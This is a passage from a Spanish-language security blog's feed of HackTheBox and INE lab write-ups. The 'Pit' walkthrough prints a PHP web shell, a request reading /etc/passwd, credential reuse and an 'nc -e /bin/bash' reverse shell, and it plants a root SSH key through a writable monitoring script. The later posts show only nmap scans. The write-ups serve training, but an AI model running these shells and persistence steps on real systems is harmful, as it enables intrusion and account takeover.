PHP Backdoor Code:
&amp;lt;?php

if(isset($_REQUEST['cmd'])){
        echo &quot;&amp;lt;pre&amp;gt;&quot;;
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo &quot;&amp;lt;/pre&amp;gt;&quot;;
        die;
}

?&amp;gt;

Step 3: Now after uploading the file check the document id corresponding to the document.
Step 4: Now go to example.com/data/1048576/&quot;document_id&quot;/1.php?cmd=cat+/etc/passwd to get the command response in browser.

Note: Here &quot;data&quot; and &quot;1048576&quot; are default folders where the uploaded files are getting saved.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Según dice, podemos crear una backdoor en PHP en cualquier carpeta en la que podamos escribir, en nuestro caso Docs/Users/Michelle, anotamos el ID correspondiente al documento y nos vamos a la ruta dms-pit.htb/seeddms51x/seeddms/Docs/Users/Michelle/id/1.php(el archivo se tiene que llamar así, si no no funciona y no sé muy bien por qué), y mediante el parámetro cmd le pasamos un comando a ejecutar, aunque yo usé una fake shell que creó &lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/pit/fakeSheedDMS.py&quot;&gt;Lanz&lt;/a&gt;(dadle una estrella porque se lo merece). Con la fake shell estuve enumerando un rato hasta que llegué a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/seeddms51x/conf/settings.xml&lt;/code&gt;, que contiene unas credenciales bastante interesantes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134780702-e2e0a1a7-28f2-436b-a4d2-c019ee07340f.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sirven para un mySQL, pero ¿y si las usamos en el panel de login del puerto 9090? Pues que funcionan.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134780746-82919ccc-de60-4b34-9903-211b67de4cd8.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;shell&quot;&gt;Conseguimos acceso&lt;/h1&gt;

&lt;p&gt;Y estaríamos dentrooooooooooooowowowowowowoooooooooo, y además con algo llamado Terminal, que tiene un uso bastante claro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134780764-959a1ba8-4d10-444d-a7da-c6caea9b901b.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;EXACTOOOO, es una terminal como Michelle!! Entonces solo hay que enviarnos una reverse shell y pa’ dentrooooo
Y encima tiene una versión relativamente nueva de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt;, así que con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -e /bin/bash tuip tupuerto&lt;/code&gt; estarías dentro como Michelle.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134780824-1004e84a-86ce-4ada-905a-a165b4f5863f.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ya si quieres, coges la User Flag, o no, como quieras. Para que no se nos vaya la shell a hacer puñetas con un ctrl+c y además hacerla interactiva, podemos hacer un &lt;a href=&quot;https://www.thehackersnow.com/tratamiento-de-una-tty/&quot;&gt;tratamiento de la TTY&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Con esto hecho, podríamos seguir en nuestro avance hacia la cocina.&lt;/p&gt;

&lt;p&gt;#Rooteada! {#root}
¿Os acordáis del archivo /usr/bin/monitor que apareció en la enumeración del servicio SNMP? Bien, pues es un script en bash bastante interesante, ya que coge todo lo que hay en /usr/local/monitoring y que se llama check [loquesea] sh y lo interpreta con bash.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[michelle@pit ~]$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Si comprobamos si tenemos permiso para escribir en /usr/local/monitoring:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;michelle@pit ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /usr/local | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;monitoring
drwxrwx---+ 2 root root 182 Sep 25 13:40 monitoring
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Lo tenemoooooooooooooooos, así que solo faltaría colar un script que haga algo malo 😈 y nos metemos hasta la cocina. En este caso he optado por meter mi clave pública de SSH en el directorio /root/.ssh/authorized_keys, así que primero generamos nuestra clave pública:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luego creamos el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_this.sh&lt;/code&gt;(para nada es malicioso, por si te lo preguntabas, te invito a descargarlo y ejecutarlo como root):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCn5F6YKC/xjiOdfvGLlq8CAu+6PtKF51x+nIxn55B73EPQ7Ev1aD/UOgtyQMysW7IGqs1XDu+bIGW6SM+JzLnuDokcCGH0NqleXlnYvMQrlWiaM1jiCBcdfl7Y6XqeAsE/jkcE4vyckZpBz1YyY/fE2fAmfRSrQh5Z80aBMhbGWTisfwChnN2c25t2sqTu8+9INf4LmHTntQbsAaRHh0MmTnSqsi/Sv2+8k1i2NvHrlGIDK4LycF5eYZcJk6XrTj02JIu86t/DE6/uXXPPK1qqlFHjYOU/SSZ83GjX++Q51bk7iHEGY4dKq0I2JaZ07TrHGs0qpiSb4Hg+OMelskK+TIeeztm71HcNnMq/LpSpT9k2WqZFwM6u9/wBSYB/JY6P+aZzIF03QX7yvME62BOgdSyMsZ+h8YL6/isi/
/PqsSTiZj8lbgU1+L997WwIelq6/y0hCm0/prl8QDcQdmTGSZofM9+4TOqRpR//7C4kcC131CQosrpQ11XbuEwFFCgT8= root@binlab&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /root/.ssh/authorized_keys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora solo faltaría meterlo en /usr/local/monitoring y esperar.
Pues esperé y no pasó nada, así que supongo que necesitará alguna interacción, como volver a ejecutar snmpwalk o algo así.&lt;/p&gt;

&lt;p&gt;Si volvemos a ejecutar snmpwalk, pero ahora pasándole &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NET-SNMP-EXTEND-MIB::nsExtendObjects&lt;/code&gt; al final para que ejecute scripts(ejem, ejem, /usr/bin/monitor, ejem, ejem) nos debería ejecutar el script, y entonces…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/134781459-ff4023d2-b722-4d56-9d4f-1ad5e8cd401b.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;VAMOOOOOOOOOOOOOOOOOOOOOOOOO HASTA LA COCINAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/p&gt;

&lt;p&gt;VALE. YA. NI MÁS. NI MENOS&lt;/p&gt;

&lt;p&gt;Si te ha gustado dame &lt;a href=&quot;https://github.com/binlaab&quot;&gt;follow y alguna estrellita, que no te cuesta 😡&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Schooled</title>
   <link href="http://0.0.0.0:80http://0.0.0.0:80/2021/09/17/schooled"/>
   <updated>2021-09-17T00:00:00+00:00</updated>
   <id>http://0.0.0.0:80/2021/09/17/schooled</id>
   <content type="html">&lt;p&gt;Schooled es una máquina FreeBSD de nivel medio, creada por &lt;a href=&quot;https://app.hackthebox.eu/users/114053&quot;&gt;TheCyberGeek&lt;/a&gt; en la que hay que descubrir un subdominio oculto, hacerle un lío al profesor para robar su Cookie de sesión, pasar al rol de Manager para explotar una RCE y escalar privilegios mediante un paquete de snap malicioso.&lt;/p&gt;

&lt;p&gt;![[2021-09-18-200551_1351x150_scrot.png]]&lt;/p&gt;

&lt;p&gt;Según la gente de HackTheBox, la clasificación de la máquina sería algo así:&lt;/p&gt;

&lt;p&gt;![[2021-09-18-200649_663x491_scrot.png]]&lt;/p&gt;

&lt;p&gt;Bastante real, y va a haber que usar algún que otro exploit y enumerar bien.&lt;/p&gt;

&lt;p&gt;1 - &lt;a href=&quot;#recon&quot;&gt;Reconocimiento inicial&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2 - &lt;a href=&quot;#enum&quot;&gt;Enumeración&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3 - &lt;a href=&quot;#exploit&quot;&gt;Explotación de la página web&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4 - &lt;a href=&quot;#privesc&quot;&gt;Escalada de privilegios&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;recon&quot;&gt;[Reconocimiento inicial]&lt;/h1&gt;

&lt;p&gt;Como siempre, empezamos con un scan de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para comprobar los puertos abiertos.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-inicial&quot;&gt;Escaneo inicial&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Sat Sep 18 20:31:19 2021 as: nmap -p- --open -sS --min-rate 3000 -n -vv -oN ports 10.10.10.234&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.234
Host is up, received echo-reply ttl 63 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.33s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Scanned at 2021-09-18 20:31:19 CEST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;43s
Not shown: 56952 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 8580 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
33060/tcp open  mysqlx  syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
&lt;span class=&quot;c&quot;&gt;# Nmap done at Sat Sep 18 20:32:02 2021 -- 1 IP address (1 host up) scanned in 43.12 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH, para obtener una shell segura&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Un servidor HTTP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;33060&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;MySQLx&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Ahora que tenemos los puertos abiertos de la máquina, podemos hacer un escaneo más a fondo para identificar que corre cada puerto&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>INE - Black Box 1</title>
   <link href="http://0.0.0.0:80http://0.0.0.0:80/2021/09/08/ine-black-box-1"/>
   <updated>2021-09-08T00:00:00+00:00</updated>
   <id>http://0.0.0.0:80/2021/09/08/INE-Black-Box-1</id>
   <content type="html">&lt;p&gt;Black Box 1 de 3 del Starter Pass de INE. En este caso estamos en un segmento de red 172.16.64.0/24(abarca desde la 172.16.64.0 hasta la 172.16.64.255)&lt;/p&gt;

&lt;p&gt;1 - &lt;a href=&quot;#recon&quot;&gt;Reconocimiento inicial&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2 - &lt;a href=&quot;#maquina1&quot;&gt;Explotamos la 172.16.64.101&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3 - &lt;a href=&quot;#maquina2&quot;&gt;Reconocimiento de 172.16.64.140 y explotación de 172.16.64.199&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4 - &lt;a href=&quot;#maquina3&quot;&gt;Credenciales ocultas para 172.16.64.182&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;recon&quot;&gt;Reconocimiento inicial&lt;/h1&gt;
&lt;p&gt;Ya que no tenemos una IP en específico para atacar, tocará hacer un escaneo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;
a todo el segmento de red.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Wed Sep  8 12:12:56 2021 as: nmap -p- --open -sC -sV -sS --min-rate 3000 -n -oN scan 172.16.64.0/24&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;172.16.64.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65529 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 2 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
8080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
9080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache-Coyote/1.1
59919/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
MAC Address: 00:50:56:A2:EC:AA &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;172.16.64.140
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65478 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 56 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-title: 404 HTML Template by Colorlib
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
MAC Address: 00:50:56:A2:E5:76 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;172.16.64.182
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65420 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 114 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
MAC Address: 00:50:56:A2:5E:B5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;172.16.64.199
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65522 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000.00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; RTM
| ms-sql-ntlm-info: 
|   Target_Name: WIN10
|   NetBIOS_Domain_Name: WIN10
|   NetBIOS_Computer_Name: WIN10
|   DNS_Domain_Name: WIN10
|   DNS_Computer_Name: WIN10
|_  Product_Version: 10.0.10586
|_ssl-date: 2021-09-08T10:16:07+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +2s from scanner time.
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SSL_Self_Signed_Fallback
| Not valid before: 2021-09-08T08:07:38
|_Not valid after:  2051-09-08T08:07:38
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49943/tcp open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SSL_Self_Signed_Fallback
| Not valid before: 2021-09-08T08:07:38
|_Not valid after:  2051-09-08T08:07:38
|_ssl-date: 2021-09-08T10:16:07+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +2s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: WIN10
|   NetBIOS_Domain_Name: WIN10
|   NetBIOS_Computer_Name: WIN10
|   DNS_Domain_Name: WIN10
|   DNS_Computer_Name: WIN10
|_  Product_Version: 10.0.10586
MAC Address: 00:50:56:A2:0A:0F &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   172.16.64.199:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
|_    TCP port: 1433
|_nbstat: NetBIOS name: WIN10, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:a2:0a:0f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-09-08T10:15:58
|_  start_date: 2021-09-08T08:07:22

Post-scan script results:
| ssh-hostkey: Possible duplicate hosts
| Key 2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; used by:
|   172.16.64.101
|   172.16.64.182
| Key 256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; used by:
|   172.16.64.101
|   172.16.64.182
| Key 256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; used by:
|   172.16.64.101
|_  172.16.64.182
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Wed Sep  8 12:16:08 2021 -- 256 IP addresses (5 hosts up) scanned in 191.45 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;puertos-abiertos&quot;&gt;Puertos abiertos&lt;/h2&gt;

&lt;p&gt;Bueno, tenemos 4 hosts disponibles con algunos puertos abiertos:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;172.16.64.101&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH, para obtener una shell segura&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;8080&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache Tomcat&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;9080&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Otro Apache Tomcat&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;59919&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache 2.4.18&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;172.16.64.140&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache 2.4.18&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;172.16.64.182&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH, para obtener una shell segura&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;172.16.64.199&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
